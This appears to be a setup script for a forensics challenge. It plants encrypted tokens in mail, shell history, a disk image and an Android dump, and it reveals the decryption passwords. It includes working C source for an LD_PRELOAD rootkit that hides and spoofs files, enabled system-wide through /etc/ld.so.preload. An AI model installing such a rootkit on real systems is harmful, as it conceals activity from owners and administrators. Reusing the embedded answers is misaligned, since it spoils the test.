#!/bin/bash
set -euo pipefail

# --- self-delete early ---
SCRIPT_PATH="/root/runtime_inject.sh"
if [ -f "$SCRIPT_PATH" ]; then
  rm -f "$SCRIPT_PATH"
fi

# Generate encrypted classified_summary.txt with token inside
mkdir -p /root

cat <<EOF > /root/plain_summary.txt
Specter, your last report on the infrastructure has proved incredibly valuable. I am impressed that you were able to obtain such details without compromise. Continue to phase 2.
TOKEN1: ${TOKEN1}
EOF

# Encrypt with OpenSSL using PBKDF2 and base64 encode it
openssl enc -aes-256-cbc -pbkdf2 -salt -in /root/plain_summary.txt -out /root/classified_summary.txt.enc -k Tr1dent9
base64 /root/classified_summary.txt.enc > /root/classified_summary.txt

# Cleanup and protect
rm /root/plain_summary.txt
chmod 600 /root/classified_summary.txt
chown root:root /root/classified_summary.txt

# Simulate Specter's bash history containing decryption attempts from clipboard/mail content
cat <<'HIST' > /home/specter/.bash_history
cd /tmp/
echo "U2FsdGVkX1+nua0eX98umf8lWtE66/ho33vHu/9Eq/etcEJhk1tdbberifWskVXIi8CzYnj9oRByOY8uRZAjig==" | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k TrId3nt9
echo "U2FsdGVkX19Mx5oe0lQdpuchKKLIyme9tm9oSoY14j+txvQz7SDiQkDRnDBjHs+cQxgWF365r64MCb0p8+Q7uw==" | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k Ov3rl00k
echo "U2FsdGVkX18+RUzk8Wx/hDLnRP8+er4sh2+02qsnl+wl6v/hNrse7dpp3pkauSkdLlUIUz61LwdDdI5/vjkbvsUdePQJUP5C1usZVb/hA0031CwmUurzRPRzuM9jO8I0gkwxYXYhvM/ipeLeWwxgdw==" | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k 7r1d3n7
echo "U2FsdGVkX18zphX9UA7fsABDeedJsFVR3wuTn9QGM4O93yVwgarRx0y6XedQk5vdlc0p8h6o0SUfquEF5H88gf32f06N5TPs1YBpFr5O0BP1C2ctOU05VgJHfT6pcYk5" | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k Tr1dent9
echo "U2FsdGVkX19xjmImA5nnpIxW+mBqdiTkfMmRgWb7hkQvgKnUxcko0yMBTN227HUsKB9X/Rb7P2IhbE8j//PQ1PW04FyJgSKjQQ0oOKNkdYJOHcQcORCSFp9uNYKDjZee" | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k Tr1dent9
HIST

chown specter:specter /home/specter/.bash_history
chmod 600 /home/specter/.bash_history

### Set up mail ###
# Prepare mailbox file
mkdir -p /var/mail
touch /var/mail/specter
chown specter:specter /var/mail/specter

# Inject raw mbox-formatted messages
cat <<EOF >> /var/mail/specter
From handler@data.securechannel.local Sat Jun  1 09:22:13 2024
Subject: Handler Update
From: handler@data.securechannel.local
To: specter@localhost

Make sure the files are extracted and sent via the secure line by midnight.

EOF

cat <<EOF >> /var/mail/specter
From bob@normalmail.com Sat Jun  1 11:15:03 2024
Subject: Re: Weekend Plans
From: bob@normalmail.com
To: specter@localhost

Pizza Friday?

EOF

cat <<EOF >> /var/mail/specter
From rewards@spamworld.biz Sat Jun  1 14:47:20 2024
Subject: [SPAM] You’ve won!
From: rewards@spamworld.biz
To: specter@localhost

Click here to claim your reward.

EOF

cat <<EOF >> /var/mail/specter
From handler@data.securechannel.local Sat Jun  1 17:09:45 2024
Subject: Final Extract
From: handler@data.securechannel.local
To: specter@localhost
Content-Type: text/plain
Content-Disposition: attachment; filename="classified_summary.txt"

$(cat /root/classified_summary.txt)

EOF

### Simulate USB Drive as Disk Image (no loop mounts / no privileges) ###
USB_IMG="/home/specter/usb.img"
USB_BUILD="/tmp/usbroot"

# Clean any previous temp build dir and image
rm -rf "$USB_BUILD"
rm -f "$USB_IMG"

# Staging directory for files that will be baked into the ext4 image
mkdir -p "$USB_BUILD"

# Add dummy distraction files
echo "Invoice #8331 - WidgetCorp Services" > "$USB_BUILD/invoice8331.txt"
echo "Project OUTLOOK Meeting Notes" > "$USB_BUILD/notes.txt"

# Build PNG with hidden payload (base64 -> gzip appended to a benign PNG)
echo "Token 2: ${TOKEN2}" | base64 | gzip > /tmp/encoded_token.gz
cat /tmp/folder-image.png /tmp/encoded_token.gz > "$USB_BUILD/photo.png"
rm /tmp/encoded_token.gz

# Create a 100MB ext4 image and populate it WITHOUT mounting using e2fsprogs -d
# Requires mkfs.ext4/mke2fs with -d support (Kali/Debian e2fsprogs >= 1.43)
# 1) Create sparse file of desired size
dd if=/dev/zero of="$USB_IMG" bs=1M count=100
# 2) Format and copy the staged tree into the image in one step
mkfs.ext4 -F -d "$USB_BUILD" "$USB_IMG"

# Set ownership for the challenge user and clean up staging dir
chown specter:specter "$USB_IMG"
rm -rf "$USB_BUILD"

### Element 4 – LD_PRELOAD persistence & covert file (runtime wiring)
# Expectation: /usr/local/lib/libprocfilter.so already exists (built in image)
# Goal here: ensure the preload is enabled and the hidden file is created at runtime
#            using the TOKEN4 env var, then clean up the env like other elements.
LOG=/var/log/runtime_inject.log
mkdir -p /var/log
touch "$LOG"
chmod 600 "$LOG"
{
  echo "[$(date -Is)] Element 4 start"
  echo "Runtime inject script started."

# Correct heredoc for C source, quoted to avoid shell expansion:
cat > /root/libprocfilter.c <<'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <stdint.h>
#include <limits.h>

static const char *HIDE_KEY = "specter_secret"; // hide names containing this
static const char *SECRET_PATH = "/usr/local/share/specter_secret.dat"; // real secret
static const char *SELF_NAME = "libprocfilter.so"; // hide ourselves too

static const char *DECOY_TEXT =
    "Nothing to see here.\n"
    "Report complete. No anomalies detected.\n";

static __thread int in_hook = 0; // reentrancy guard
#define ENTER_HOOK_RET(retval) do { if (in_hook++) return (retval); } while (0)
#define LEAVE_HOOK() do { in_hook--; } while (0)

static bool strcasestr_bool(const char *hay, const char *needle) {
    if (!hay || !needle) return false;
    for (const char *p = hay; *p; ++p) {
        const char *h = p, *n = needle;
        while (*h && *n && (tolower((unsigned char)*h) == tolower((unsigned char)*n))) { h++; n++; }
        if (!*n) return true;
    }
    return false;
}

static int same_secret_inode(const char *path) {
    if (!path) return 0;
    struct stat a, b;
    if (syscall(SYS_newfstatat, AT_FDCWD, SECRET_PATH, &a, AT_SYMLINK_NOFOLLOW) != 0) return 0;
    if (syscall(SYS_newfstatat, AT_FDCWD, path,        &b, AT_SYMLINK_NOFOLLOW) != 0) return 0;
    return (a.st_ino == b.st_ino) && (a.st_dev == b.st_dev);
}

// ------------- DIR HIDING -------------
typedef struct dirent *(*readdir_t)(DIR *);
typedef struct dirent64 *(*readdir64_t)(DIR *);
static readdir_t real_readdir = NULL; static readdir64_t real_readdir64 = NULL;
static void init_readdir_syms(void){ if(!real_readdir) real_readdir=(readdir_t)dlsym(RTLD_NEXT,"readdir"); if(!real_readdir64) real_readdir64=(readdir64_t)dlsym(RTLD_NEXT,"readdir64"); }
static int should_hide_name(const char *name){ if(!name) return 0; if(strcasestr_bool(name,HIDE_KEY)) return 1; if(strcasestr_bool(name,SELF_NAME)) return 1; return 0; }
struct dirent *readdir(DIR *d){ init_readdir_syms(); if(!real_readdir) return NULL; ENTER_HOOK_RET(NULL); struct dirent *e; while((e=real_readdir(d))){ if(!should_hide_name(e->d_name)) break; } LEAVE_HOOK(); return e; }
struct dirent64 *readdir64(DIR *d){ init_readdir_syms(); if(!real_readdir64) return NULL; ENTER_HOOK_RET(NULL); struct dirent64 *e; while((e=real_readdir64(d))){ if(!should_hide_name(e->d_name)) break; } LEAVE_HOOK(); return e; }

// ------------- OPEN HIJACK -------------
typedef int (*open_t)(const char*,int,...); typedef int (*open64_t)(const char*,int,...);
static open_t real_open=NULL; static open64_t real_open64=NULL;
static void init_open_syms(void){ if(!real_open) real_open=(open_t)dlsym(RTLD_NEXT,"open"); if(!real_open64) real_open64=(open64_t)dlsym(RTLD_NEXT,"open64"); }
static int deny_secret_open(void){ errno=ENOENT; return -1; }
int open(const char *path,int flags,...){ init_open_syms(); if(!real_open){ errno=EIO; return -1;} mode_t mode=0; if(flags & O_CREAT){ va_list ap; va_start(ap,flags); mode=va_arg(ap,int); va_end(ap);} ENTER_HOOK_RET(-1); if ((uintptr_t)path == 0) { LEAVE_HOOK(); errno = EINVAL; return -1; } if (strcmp(path, SECRET_PATH) == 0 || same_secret_inode(path)) { LEAVE_HOOK(); return deny_secret_open(); } int fd=real_open(path,flags,mode); LEAVE_HOOK(); return fd; }
int open64(const char *path,int flags,...){ init_open_syms(); if(!real_open64) return -1; mode_t mode=0; if(flags & O_CREAT){ va_list ap; va_start(ap,flags); mode=va_arg(ap,int); va_end(ap);} ENTER_HOOK_RET(-1); if ((uintptr_t)path == 0) { LEAVE_HOOK(); errno = EINVAL; return -1; } if (strcmp(path, SECRET_PATH) == 0 || same_secret_inode(path)) { LEAVE_HOOK(); return deny_secret_open(); } int fd=real_open64(path,flags,mode); LEAVE_HOOK(); return fd; }

// Also intercept openat/openat64 because many modern glibc builds use openat()
typedef int (*openat_t)(int,const char*,int,...);
typedef int (*openat64_t)(int,const char*,int,...);
static openat_t real_openat=NULL; static openat64_t real_openat64=NULL;
static void init_openat_syms(void){ if(!real_openat) real_openat=(openat_t)dlsym(RTLD_NEXT,"openat"); if(!real_openat64) real_openat64=(openat64_t)dlsym(RTLD_NEXT,"openat64"); }

int openat(int dirfd,const char *path,int flags,...){
    init_openat_syms();
    if(!real_openat){ errno=EIO; return -1; }
    mode_t mode=0; if(flags & O_CREAT){ va_list ap; va_start(ap,flags); mode=va_arg(ap,int); va_end(ap);} 
    ENTER_HOOK_RET(-1);
    if ((uintptr_t)path == 0) { LEAVE_HOOK(); errno = EINVAL; return -1; }
    if (strcmp(path, SECRET_PATH) == 0 || same_secret_inode(path)) { LEAVE_HOOK(); return deny_secret_open(); }
    int fd=real_openat(dirfd,path,flags,mode);
    LEAVE_HOOK();
    return fd;
}

int openat64(int dirfd,const char *path,int flags,...){
    init_openat_syms();
    if(!real_openat64){ errno=EIO; return -1; }
    mode_t mode=0; if(flags & O_CREAT){ va_list ap; va_start(ap,flags); mode=va_arg(ap,int); va_end(ap);} 
    ENTER_HOOK_RET(-1);
    if ((uintptr_t)path == 0) { LEAVE_HOOK(); errno = EINVAL; return -1; }
    if (strcmp(path, SECRET_PATH) == 0 || same_secret_inode(path)) { LEAVE_HOOK(); return deny_secret_open(); }
    int fd=real_openat64(dirfd,path,flags,mode);
    LEAVE_HOOK();
    return fd;
}

// Intercept openat2 if present (glibc may use it on newer kernels)
// Signature: int openat2(int dirfd, const char *pathname, void *how, size_t size)
typedef int (*openat2_t)(int,const char*,void*,size_t);
static openat2_t real_openat2 = NULL;
static void init_openat2_syms(void){ if(!real_openat2) real_openat2 = (openat2_t)dlsym(RTLD_NEXT, "openat2"); }
int openat2(int dirfd, const char *path, void *how, size_t size){
    init_openat2_syms();
    if(!real_openat2){ errno = EIO; return -1; }
    ENTER_HOOK_RET(-1);
    if ((uintptr_t)path == 0) { LEAVE_HOOK(); errno = EINVAL; return -1; }
    if (strcmp(path, SECRET_PATH) == 0 || same_secret_inode(path)) { LEAVE_HOOK(); return deny_secret_open(); }
    int rc = real_openat2(dirfd, path, how, size);
    LEAVE_HOOK();
    return rc;
}

// ------------- FOPEN DECOY -------------
typedef FILE *(*fopen_t)(const char*,const char*); typedef FILE *(*fopen64_t)(const char*,const char*);
static fopen_t real_fopen=NULL; static fopen64_t real_fopen64=NULL;
static void init_fopen_syms(void){ if(!real_fopen) real_fopen=(fopen_t)dlsym(RTLD_NEXT,"fopen"); if(!real_fopen64) real_fopen64=(fopen64_t)dlsym(RTLD_NEXT,"fopen64"); }
static FILE *decoy_stream(void){ size_t len=strlen(DECOY_TEXT); char *buf=(char*)malloc(len+1); if(!buf) return NULL; memcpy(buf,DECOY_TEXT,len+1); FILE *fp=fmemopen(buf,len,"r"); return fp; }
FILE *fopen(const char *path,const char *mode){ init_fopen_syms(); if(!real_fopen) return NULL; ENTER_HOOK_RET(NULL); if(path && strcmp(path,SECRET_PATH)==0){ FILE *fp=decoy_stream(); LEAVE_HOOK(); return fp; } FILE *fp=real_fopen(path,mode); LEAVE_HOOK(); return fp; }
FILE *fopen64(const char *path,const char *mode){ init_fopen_syms(); if(!real_fopen64) return NULL; ENTER_HOOK_RET(NULL); if(path && strcmp(path,SECRET_PATH)==0){ FILE *fp=decoy_stream(); LEAVE_HOOK(); return fp; } FILE *fp=real_fopen64(path,mode); LEAVE_HOOK(); return fp; }

// ------------- CONSTRUCTOR: write secret from env TOKEN4 (once) -------------
__attribute__((constructor)) static void init_secret(void){
    const char *tok = getenv("TOKEN4");
    if(!tok || !*tok) return;
    struct stat st; if(stat(SECRET_PATH,&st)==0 && st.st_size>0) return; // already present
    // Use raw syscall to bypass our open() hook
    int fd = (int)syscall(SYS_openat, AT_FDCWD, SECRET_PATH, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if(fd<0) return;
    dprintf(fd, "Token 4: %s\n", tok);
    close(fd);
}

EOF

  # 1) Ensure toolchain exists (install minimal if missing)
  if ! command -v gcc >/dev/null 2>&1; then
    echo "gcc not found; installing minimal toolchain..."
    apt-get update >>"$LOG" 2>&1 || true
    apt-get install -y --no-install-recommends gcc libc6-dev make binutils >>"$LOG" 2>&1 || echo "WARNING: apt install failed"
  fi

  # 2) Build the shared object if missing
  if [ ! -f /usr/local/lib/libprocfilter.so ]; then
    echo "Compiling libprocfilter.so..."
    if gcc -shared -fPIC -O2 -Wall -Wextra -o /usr/local/lib/libprocfilter.so /root/libprocfilter.c -ldl >>"$LOG" 2>&1; then
      command -v strip >/dev/null 2>&1 && strip /usr/local/lib/libprocfilter.so || true
      echo "Build OK: /usr/local/lib/libprocfilter.so"
    else
      echo "ERROR: gcc build failed see $LOG"
    fi
  else
    echo "libprocfilter.so already present; skipping build"
  fi

  # 3) Enable global preload (idempotent)
  if [ -f /usr/local/lib/libprocfilter.so ]; then
    if ! grep -qxF "/usr/local/lib/libprocfilter.so" /etc/ld.so.preload 2>/dev/null; then
      echo "/usr/local/lib/libprocfilter.so" >> /etc/ld.so.preload
      echo "Enabled preload in /etc/ld.so.preload"
    else
      echo "Preload already enabled"
    fi
  else
    echo "ERROR: /usr/local/lib/libprocfilter.so missing; skipping preload enable"
  fi

  # 4) Create the real secret file using TOKEN4 (bypass hooks during write)
  if [ -n "${TOKEN4:+x}" ]; then
    echo "TOKEN4 present? yes"
  else
    echo "TOKEN4 present? no"
  fi
  if [ -n "${TOKEN4:+x}" ]; then
  # Do directory creation + write in the same sanitized subshell
  if env -i PATH="/usr/sbin:/usr/bin:/sbin:/bin" TOKEN4="${TOKEN4}" \
     /bin/sh -lc 'umask 022; \
                   mkdir -p /usr/local/share && \
                   printf "Token 4: %s\n" "$TOKEN4" > /usr/local/share/specter_secret.dat && \
                   chmod 644 /usr/local/share/specter_secret.dat'; then
                             
    # Verify from a sanitized shell as well
    if env -i PATH="/usr/sbin:/usr/bin:/sbin:/bin" LD_PRELOAD= \
       /bin/sh -lc 'test -s /usr/local/share/specter_secret.dat'; then
      FIRST_LINE=$(env -i PATH="/usr/sbin:/usr/bin:/sbin:/bin" LD_PRELOAD= /bin/sh -lc 'head -n1 /usr/local/share/specter_secret.dat' 2>/dev/null || true)
      echo "First line bypass: ${FIRST_LINE}"
      echo "Secret file created and verified."
    else
      echo "ERROR: Secret file verification failed."
    fi
  else
    echo "ERROR: Secret file write failed."
  fi

  fi

  # 5) Trigger one process so preload is exercised at least once
  LD_PRELOAD= /bin/true >/dev/null 2>&1 || true
  echo "[$(date -Is)] Element 4 end" 
} >>"$LOG" 2>&1

### Element 5 – Mobile artifact injection (Android .ab backup with token inside)
echo "[+] Android artifact injection starting" >> "$LOG"

# Consolidate token injection and ensure encryption
SQLITE_DB_PATH="/root/android_dump/data/data/com.specter.securechat/databases/messages.db"
CACHE_KEY=$(jq -r '.cache_key' /root/android_dump/data/data/com.specter.securechat/cache/cache.json)

# Inject TOKEN5 as-is before encrypting other messages
if [ -n "$TOKEN5" ]; then
    sqlite3 "$SQLITE_DB_PATH" <<EOF
    INSERT INTO messages (_id, thread_id, address, date_sent, date_received, body, type, read)
    VALUES (9, 3, 'unknown', strftime('%s','now'), strftime('%s','now'), '$TOKEN5', 2, 0);
EOF
    echo "[+] Token 5 injected as-is into messages.db" >> "$LOG"
else
    echo "[-] TOKEN5 environment variable is not set. Token injection skipped." >> "$LOG"
fi

# Encrypt all messages in the database with proper padding
if [ -f "$SQLITE_DB_PATH" ]; then
    while IFS='|' read -r ID BODY; do
        if [ -n "$BODY" ]; then
            # Ensure proper Base64 encoding and encryption
            ENCRYPTED_BODY=$(echo -n "$BODY" | openssl enc -aes-256-cbc -pbkdf2 -salt -k "$CACHE_KEY" | base64 | tr -d '\n')
            sqlite3 "$SQLITE_DB_PATH" "UPDATE messages SET body = '$ENCRYPTED_BODY' WHERE _id = $ID;"
        fi
    done < <(sqlite3 "$SQLITE_DB_PATH" "SELECT _id, body FROM messages WHERE body IS NOT NULL;")
    echo "[+] All messages encrypted in messages.db" >> "$LOG"
else
    echo "[-] SQLite database not found at $SQLITE_DB_PATH" >> "$LOG"
fi

# Use zip to compress the Android dump at runtime with password protection and place it in /home/specter
rm -f /root/android_dump/data/data/com.specter.securechat/databases/messages.sql
zip -r -P "eagle" /home/specter/android_dump.zip /root/android_dump
chown specter:specter /home/specter/android_dump.zip
chmod 600 /home/specter/android_dump.zip


###### DO THIS LAST ######
# Sanitize Specter's shell environment at login
echo 'unset TOKEN1' >> /home/specter/.bashrc
echo 'unset TOKEN2' >> /home/specter/.bashrc
echo 'unset TOKEN4' >> /home/specter/.bashrc
echo 'unset TOKEN5' >> /home/specter/.bashrc

unset TOKEN1
unset TOKEN2
unset TOKEN4
unset TOKEN5

rm -f /root/classified_summary.txt.enc
rm -f /root/classified_summary.txt
rm -f /root/libprocfilter.c
rm -f /root/messages.db.template
rm -rf /root/android_dump
chmod 700 /root

# Forward to CMD (sshd -D)
exec "$@"
############################